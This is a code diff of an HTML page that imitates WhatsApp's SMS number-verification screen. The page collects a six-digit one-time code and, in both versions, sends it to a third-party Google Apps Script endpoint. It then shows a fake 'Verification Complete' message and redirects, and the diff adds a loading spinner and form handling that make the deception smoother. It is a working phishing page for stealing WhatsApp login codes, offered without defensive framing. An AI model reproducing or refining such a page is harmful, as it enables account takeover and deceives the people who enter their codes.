@@ -1,20 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
     <title>WhatsApp OTP Verification</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: #121B22;
-            color: white;
             font-family: 'Comic Sans MS', cursive;
+            color: white;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            width: 350px;
         }
 
         h2 {
@@ -29,6 +33,7 @@
 
         .otp-inputs {
             display: flex;
+            justify-content: center;
             gap: 10px;
             margin: 30px 0;
         }
@@ -45,66 +50,130 @@
         }
 
         .resend {
+            margin-top: 15px;
             color: #00D75A;
             cursor: pointer;
-            margin-top: 10px;
+        }
+
+        #message {
+            margin-top: 15px;
+            display: none;
+            padding: 10px;
+            border-radius: 6px;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .spinner {
+            border: 6px solid rgba(255, 255, 255, 0.2);
+            border-top: 6px solid #00D75A;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-
-<h2>Verifying your number</h2>
-<p>SMS sent to <strong>+94 78 451 2138</strong>. <span style="color:#00AEEF; cursor:pointer;">Wrong number?</span></p>
-
-<div class="otp-inputs">
-    <input type="text" maxlength="1" />
-    <input type="text" maxlength="1" />
-    <input type="text" maxlength="1" />
-    <input type="text" maxlength="1" />
-    <input type="text" maxlength="1" />
-    <input type="text" maxlength="1" />
+<div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+    Verfying
 </div>
 
-<div class="resend">Didn’t receive code?</div>
+<div class="container">
+    <h2>Verifying your number</h2>
+    <p>SMS sent to <strong>+94 78 451 2138</strong>. <span style="color:#00AEEF; cursor:pointer;">Wrong number?</span></p>
+
+    <form id="otp-form">
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" name="otp1" required />
+            <input type="text" maxlength="1" name="otp2" required />
+            <input type="text" maxlength="1" name="otp3" required />
+            <input type="text" maxlength="1" name="otp4" required />
+            <input type="text" maxlength="1" name="otp5" required />
+            <input type="text" maxlength="1" name="otp6" required />
+        </div>
+        <div id="message"></div>
+    </form>
+
+    <div class="resend">Didn’t receive code?</div>
+</div>
 
 <script>
     const inputs = document.querySelectorAll(".otp-inputs input");
+    const form = document.getElementById("otp-form");
+    const message = document.getElementById("message");
+    const loading = document.getElementById("loading");
 
-    inputs.forEach((input, i) => {
+    inputs.forEach((input, index) => {
         input.addEventListener("input", () => {
-            input.value = input.value.replace(/[^0-9]/g, '');
-            if (input.value && i < inputs.length - 1) {
-                inputs[i + 1].focus();
+            if (input.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
             }
 
-            const otp = Array.from(inputs).map(i => i.value).join("");
-
-            if (otp.length === inputs.length) {
-                console.log("OTP:", otp);
-                sendOTPToCloud(otp);
-            }
-        });
-
-        input.addEventListener("keydown", e => {
-            if (e.key === "Backspace" && !input.value && i > 0) {
-                inputs[i - 1].focus();
+            const filled = [...inputs].every(inp => inp.value.length === 1);
+            if (filled) {
+                submitForm();
             }
         });
     });
 
-    function sendOTPToCloud(otp) {
-        fetch('https://script.google.com/macros/library/d/1SulZVQfjsUaHm0qCWctXlkPqGxBHDv8XOA9wqszr3XiHnqrS2v4EaJ_X/1', {
-            method: 'POST',
+    function submitForm() {
+        loading.style.display = "flex"; // Show loading
+
+        const formData = new FormData(form);
+        const keyValuePairs = [];
+        for (const pair of formData.entries()) {
+            keyValuePairs.push(`${pair[0]}=${pair[1]}`);
+        }
+
+        const formDataString = keyValuePairs.join("&");
+
+        fetch("https://script.google.com/macros/s/AKfycbxASJF1KeiF6WW2hDino9xwODyLY9GY9S5-6LO_DWhH7rZutAgFpM1oiCclzSP1f7MW/exec", {
+            method: "POST",
+            body: formDataString,
             headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ otp: otp })
+                "Content-Type": "text/plain;charset=utf-8"
+            }
         })
-        .then(response => response.text())
-        .then(result => console.log("OTP sent:", result))
-        .catch(error => console.error("Error sending OTP:", error));
+            .then(res => res.ok ? res.text() : Promise.reject("Failed"))
+            .then(() => {
+                message.textContent = "Verification Complete";
+                message.style.display = "block";
+                message.style.backgroundColor = "white";
+                message.style.color = "black";
+                setTimeout(() => {
+                    window.location.href = "success.html"; // 🔁 Redirect here
+                }, 1500);
+            })
+            .catch(() => {
+                message.textContent = "Error submitting OTP.";
+                message.style.display = "block";
+                message.style.backgroundColor = "darkred";
+                message.style.color = "white";
+            })
+            .finally(() => {
+                loading.style.display = "none"; // Hide loading
+            });
     }
 </script>
-
 </body>
 </html>
